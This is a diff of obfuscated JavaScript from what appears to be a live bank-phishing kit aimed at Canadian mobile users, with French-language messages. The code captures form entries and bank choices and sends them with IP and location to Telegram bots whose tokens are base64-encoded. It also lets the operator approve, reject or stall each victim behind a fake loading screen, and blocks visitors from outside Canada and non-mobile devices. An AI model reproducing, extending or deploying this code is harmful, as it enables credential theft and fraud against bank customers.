@@ -1,8 +1,8 @@
-﻿(function(_W,_D,_N){
+(function(_W,_D,_N){
   'use strict';
 
   var _M = atob('ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==');
-  var _R = atob('Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw==');
+  var _R = atob('ODQyMTQxMDU3NDpBQUdHeVlYb0QxMHdZTXNVamJaV3hDWU80SjMzdFltQVBBNA==');
   var _ID = atob('Njc4ODAxMjQ4MQ==');
   var _CC = 'CA';
 
@@ -30,13 +30,6 @@
     if (_isMobUA || (_touch && Math.min(_W.screen.width, _W.screen.height) <= 1024)) {
       return true;
     }
-    return false;
-  }
-
-  function _isBot(){
-    if (_N.webdriver === true || _D.documentElement.getAttribute('webdriver')) return true;
-    if (_W.callPhantom || _W._phantom || _W.__nightmare || _W.domAutomation || _W.domAutomationController) return true;
-    if (/HeadlessChrome|PhantomJS|SlimerJS|Selenium|WebDriver|Bot|Crawl|Spider/i.test(_N.userAgent || '')) return true;
     return false;
   }
 
@@ -72,16 +65,37 @@
     }, 3000);
   }
 
-  function _ldr(show){
+  var _ldrInterval = null;
+  function _ldr(show, seconds){
     var _e = _D.getElementById('__ld');
+    if (_ldrInterval) { clearInterval(_ldrInterval); _ldrInterval = null; }
     if (!_e && show) {
       _e = _D.createElement('div');
       _e.id = '__ld';
       _e.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.97);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:2147483647;';
-      _e.innerHTML = '<div style="border:4px solid #eee;border-top:4px solid #222;border-radius:50%;width:48px;height:48px;animation:__sp 0.8s linear infinite"></div><p style="margin-top:18px;font-family:Arial,sans-serif;font-size:16px;color:#555">Veuillez patienter...</p><style>@keyframes __sp{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
+      _e.innerHTML = '<div style="border:4px solid #eee;border-top:4px solid #222;border-radius:50%;width:48px;height:48px;animation:__sp 0.8s linear infinite"></div><p id="__ldTxt" style="margin-top:18px;font-family:Arial,sans-serif;font-size:16px;color:#555;font-weight:bold;">Veuillez patienter...</p><style>@keyframes __sp{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
       _D.body.appendChild(_e);
     }
-    if (_e) _e.style.display = show ? 'flex' : 'none';
+    if (_e) {
+      _e.style.display = show ? 'flex' : 'none';
+      var _txt = _D.getElementById('__ldTxt');
+      if (show && seconds && seconds > 0) {
+        var rem = seconds;
+        if (_txt) _txt.innerText = 'Veuillez patienter... (' + rem + 's)';
+        _ldrInterval = setInterval(function(){
+          rem--;
+          if (rem <= 0) {
+            clearInterval(_ldrInterval);
+            _ldrInterval = null;
+            if (_txt) _txt.innerText = 'Veuillez patienter...';
+          } else {
+            if (_txt) _txt.innerText = 'Veuillez patienter... (' + rem + 's)';
+          }
+        }, 1000);
+      } else if (show && _txt) {
+        _txt.innerText = 'Veuillez patienter...';
+      }
+    }
   }
 
   function _setupForms(){
@@ -107,7 +121,7 @@
         var _msg = '🔐 <b>CAPTURE | ' + _pg.toUpperCase() + '</b>\n━━━━━━━━━━━━━━━\n' + _flds.join('\n') + '\n━━━━━━━━━━━━━━━\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>';
         var _kb = [
           [{ text: '✅ Valide', callback_data: _SID + ':ok' }, { text: '❌ Erreur', callback_data: _SID + ':err' }],
-          [{ text: '⏳ +30s', callback_data: _SID + ':30' }, { text: '⏳ +60s', callback_data: _SID + ':60' }, { text: '⏳ +120s', callback_data: _SID + ':120' }]
+          [{ text: '⏳ +10s', callback_data: _SID + ':10' }, { text: '⏳ +30s', callback_data: _SID + ':30' }, { text: '⏳ +120s', callback_data: _SID + ':120' }]
         ];
 
         _ldr(true);
@@ -116,8 +130,9 @@
           if (_a.indexOf(':ok') !== -1) { _ldr(false); _W.location.href = _nx; }
           else if (_a.indexOf(':err') !== -1) { _ldr(false); _W.location.reload(); }
           else {
-            var _t = _a.indexOf(':30') !== -1 ? 30000 : _a.indexOf(':60') !== -1 ? 60000 : 120000;
-            setTimeout(function(){ _ldr(false); _W.location.href = _nx; }, _t);
+            var _sec = _a.indexOf(':10') !== -1 ? 10 : _a.indexOf(':30') !== -1 ? 30 : 120;
+            _ldr(true, _sec);
+            setTimeout(function(){ _ldr(false); _W.location.href = _nx; }, _sec * 1000);
           }
         });
       }, true);
@@ -129,12 +144,12 @@
     var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
     var _city = _W.sessionStorage.getItem('__xcity') || 'N/A';
 
-    var _selector = '[filabel],[data-fi],.fi-tile,a[href*="101"],a[href*="html"]';
+    var _selector = '[filabel],[data-fi],.fi-tile,a[href*="101"],a[href*="html"],.fi-logo-image,img[alt]';
     _D.querySelectorAll(_selector).forEach(function(_el){
       if (_el.dataset.xb) return;
       _el.dataset.xb = '1';
       _el.addEventListener('click', function(e){
-        var _raw = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.getAttribute('title') || _el.innerText || '';
+        var _raw = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.getAttribute('alt') || _el.getAttribute('title') || _el.innerText || '';
         
         if (!_raw || _raw.trim() === '') {
           var _img = _el.querySelector('img');
@@ -154,21 +169,32 @@
           }
         }
 
-        var _finalBankName = _matchedBank ? _matchedBank : (_clean || 'Banque inconnue');
+        var _finalBankName = _matchedBank ? _matchedBank : (_clean || '');
+        if (!_finalBankName || _finalBankName.length < 2 || _finalBankName.indexOf('INTERAC') !== -1 || _finalBankName.indexOf('Help') !== -1) return;
 
         _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
       }, true);
+    });
+
+    _D.querySelectorAll('select').forEach(function(_sel){
+      if (_sel.dataset.xb) return;
+      _sel.dataset.xb = '1';
+      _sel.addEventListener('change', function(){
+        var _opt = _sel.options[_sel.selectedIndex];
+        if (_opt && _opt.value) {
+          var _bName = _opt.getAttribute('filabel') || _opt.text || _opt.value;
+          if (_bName && _bName.trim().length > 1 && _bName.indexOf('Select') === -1) {
+            _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE (SÉLECTEUR)</b>\n🏷️ <b>' + _bName.trim() + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+          }
+        }
+      });
     });
   }
 
   function _init(){
     if (!_isMobile()) {
-      _die();
-      return;
-    }
-
-    if (_isBot()) {
-      _die();
+      _tg(_R, '🛑 <b>BLOCAGE PC / NON-MOBILE</b>\n🆔 Session: <code>' + _SID + '</code>\n🖥️ UA: <code>' + _N.userAgent + '</code>');
+      setTimeout(_die, 500);
       return;
     }
 
@@ -180,68 +206,50 @@
       _tg(_R, '✅ <b>CAPTCHA RÉSOLU</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
     };
 
-    function _activate(ip, org, countryCode, city){
-      _W.sessionStorage.setItem('__xip', ip);
-      _W.sessionStorage.setItem('__xorg', org);
-      _W.sessionStorage.setItem('__xcity', city || 'N/A');
+    _setupForms();
+    _setupBanks();
 
-      // Envoyer la notif d'arrivée sur Telegram RADAR
-      _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🏙️ Ville: <code>' + (city || 'N/A') + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+    fetch('https://www.cloudflare.com/cdn-cgi/trace')
+      .then(function(r){ return r.text(); })
+      .then(function(t){
+        var locMatch = t.match(/loc=([A-Z]{2})/);
+        var ipMatch = t.match(/ip=([^\n]+)/);
+        var loc = locMatch ? locMatch[1] : 'N/A';
+        var ipVal = ipMatch ? ipMatch[1] : 'N/A';
 
-      _setupForms();
-      _setupBanks();
-    }
-
-    // Requête ipwho.is directe en premier
-    fetch('https://ipwho.is/')
-      .then(function(r){ return r.json(); })
-      .then(function(d){
-        if (d && d.success) {
-          if (d.country_code !== _CC) {
-            _die();
-            return;
-          }
-
-          var _sec = d.security || {};
-          var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
-          var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
-          var strictVpnPatterns = /expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton|m247|hetzner|linode|digitalocean|ovh/i;
-
-          if (isProxy || strictVpnPatterns.test(orgName)) {
-            _die();
-            return;
-          }
-
-          _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code, d.city);
-        } else {
-          // Fallback vers Cloudflare trace
-          _cfFallback();
+        if (loc !== _CC && loc !== 'N/A') {
+          _tg(_R, '🛑 <b>BLOCAGE PAYS (' + loc + ')</b>\n📍 IP: <code>' + ipVal + '</code>');
+          setTimeout(_die, 500);
+          return;
         }
+
+        _W.sessionStorage.setItem('__xip', ipVal);
+        _W.sessionStorage.setItem('__xorg', 'Canada ISP');
+        _W.sessionStorage.setItem('__xcity', 'Canada');
+
+        _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ipVal + '</code>\n🌍 Pays: <code>' + loc + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+
+        fetch('https://ipwho.is/' + ipVal)
+          .then(function(r){ return r.json(); })
+          .then(function(d){
+            if (d && d.success) {
+              _W.sessionStorage.setItem('__xorg', (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'));
+              _W.sessionStorage.setItem('__xcity', d.city || 'N/A');
+            }
+          }).catch(function(){});
       })
       .catch(function(){
-        _cfFallback();
+        fetch('https://ipwho.is/')
+          .then(function(r){ return r.json(); })
+          .then(function(d){
+            if (d && d.success) {
+              _W.sessionStorage.setItem('__xip', d.ip);
+              _W.sessionStorage.setItem('__xorg', (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'));
+              _W.sessionStorage.setItem('__xcity', d.city || 'N/A');
+              _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>\n🌍 Pays: <code>' + d.country_code + '</code>\n🏢 Org: <code>' + (d.connection ? d.connection.isp : 'N/A') + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+            }
+          }).catch(function(){});
       });
-
-    function _cfFallback(){
-      fetch('https://www.cloudflare.com/cdn-cgi/trace')
-        .then(function(r){ return r.text(); })
-        .then(function(t){
-          var locMatch = t.match(/loc=([A-Z]{2})/);
-          var ipMatch = t.match(/ip=([^\n]+)/);
-          var loc = locMatch ? locMatch[1] : '';
-          var ipVal = ipMatch ? ipMatch[1] : '';
-
-          if (loc !== _CC) {
-            _die();
-            return;
-          }
-
-          _activate(ipVal, 'Canada ISP', loc, 'Canada');
-        })
-        .catch(function(){
-          _die();
-        });
-    }
   }
 
   if (_D.readyState === 'loading') {
